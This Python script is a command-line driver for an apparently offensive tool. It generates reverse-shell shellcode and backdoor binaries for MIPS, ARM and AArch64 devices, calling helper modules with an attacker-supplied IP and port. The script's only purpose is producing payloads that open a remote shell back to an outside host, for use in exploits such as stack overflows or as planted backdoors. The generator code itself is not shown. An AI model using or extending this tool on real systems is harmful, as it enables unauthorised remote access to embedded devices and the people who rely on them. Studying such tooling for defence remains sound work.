import sys
import argparse
import os
try:
	from pwn import *
except:
	os.system("pip install pwn")
import generate_mips
import generate_arm
import generate_aarch64
import extract_shellcode
import re
'''
print "example : ./make_reverse_shellcode target_ip port filename"
try:
	reverse_ip=sys.argv[1]
	reverse_port=int(sys.argv[2])
	aim_arch=sys.argv[3]
except:
	print "example : ./make_reverse_shellcode target_ip port filename"
	exit()
context.arch='aarch64'
context.endian=aim_arch
'''
'''
'''

def check_ip(ipAddr):
    compile_ip=re.compile('^(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)$')
    if compile_ip.match(ipAddr):
        return True
    else:
    	log.info("error ip address")
        exit()

def check_port(port):
	if port<0 or port>65535:
		log.info("error port")
		exit()

if __name__=="__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument('-reverse_ip', required=True, type=str, default=None, help='reverse ip address')
	parser.add_argument('-reverse_port', required=True, type=int, default=4444, help='reverse port address please input high port')
	parser.add_argument('-arch', required=True, type=str, default=None, help='file arch')
	parser.add_argument('-endian', required=True, type=str, default=None, help='file endian')
	parser.add_argument('-filename', required=False, type=str, default=None, help='specify a filename')
	parser.add_argument('-arch_version', required=False, type=str, default=None, help='arm version Default is armv7')
	parser.add_argument('-exploit_shellcode', required=False, type=str, default=None, help='shellcode for vul like stackoverflow and os on (no NULL byte)')
	parser.add_argument('-backdoor_file', required=False, type=str, default=None, help='shellcode for vul like stackoverflow and os on (no NULL byte)')
	args = parser.parse_args()
	check_ip(args.reverse_ip)
	check_port(args.reverse_port)
	reverse_ip=args.reverse_ip
	reverse_port=args.reverse_port
	filename=args.filename
	context.arch=args.arch
	context.endian=args.endian
	if args.exploit_shellcode==None and args.backdoor_file==None:
		log.info("It is necessary whether the generation target is a backdoor or shellcode")
		exit()
	if args.exploit_shellcode!=None and args.backdoor_file==None:
		if context.arch=="mips" and context.endian=="little":
			generate_mips.generate_mipsel_shellcode(reverse_ip,reverse_port)
		if context.arch=="mips" and context.endian=="big":
			generate_mips.generate_mips_shellcode(reverse_ip,reverse_port)
		if context.arch=="arm"  and context.endian=='little':
			if args.arch_version!="v7" and  args.arch_version!=None:
				generate_arm.generate_armelv5_shellcode(reverse_ip,reverse_port)
			else:
				generate_arm.generate_armelv7_shellcode(reverse_ip,reverse_port)
		if context.arch=="arm" and context.endian=="big":
			if args.arch_version!="v7" and args.arch_version!=None:
				generate_arm.generate_armebv5_shellcode(reverse_ip,reverse_port)
			else:
				generate_arm.generate_armebv7_shellcode(reverse_ip,reverse_port)
		if context.arch=="aarch64" and context.endian=="little":
			generate_aarch64.generate_aarch64_shellcode(reverse_ip,reverse_port)
	if args.exploit_shellcode==None and args.backdoor_file!=None:
		if context.arch=="mips" and context.endian=="little":
			generate_mips.generate_mipsel_backdoor(reverse_ip,reverse_port,filename)
		if context.arch=="mips" and context.endian=="big":
			generate_mips.generate_mips_backdoor(reverse_ip,reverse_port,filename)
		if context.arch=="arm"  and context.endian=='little':
			if args.arch_version!="v7" and args.arch_version!=None:
				generate_arm.generate_armelv5_backdoor(reverse_ip,reverse_port,filename)
			else:
				generate_arm.generate_armelv7_backdoor(reverse_ip,reverse_port,filename)
		if context.arch=="arm" and context.endian=="big":
			if args.arch_version!="v7" and args.arch_version!=None:
				generate_arm.generate_armebv5_backdoor(reverse_ip,reverse_port,filename)
			else:
				generate_arm.generate_armebv7_backdoor(reverse_ip,reverse_port,filename)
		if context.arch=="aarch64" and context.endian=="little":
			generate_aarch64.generate_aarch64_backdoor(reverse_ip,reverse_port,filename)

'''
	arm_version=args.arch_version
	if context.arch == "aarch64":
		generate_aarch64(reverse_ip,reverse_port,filename)
	if context.arch == 'arm':
		if arm_version=="armv7":
			generate_arm(reverse_ip,reverse_port,filename)
		else:
			generate_arm_low()
	if context.arch=='mips' and args.exploit_shellcode==None:
		generate_mips.generate_mipsel_backdoor(reverse_ip,reverse_port,filename)
	if context.arch=="mips" and args.exploit_shellcode!=None:
		generate_mips.generate_mipsel_shellcode(reverse_ip,reverse_port)
'''
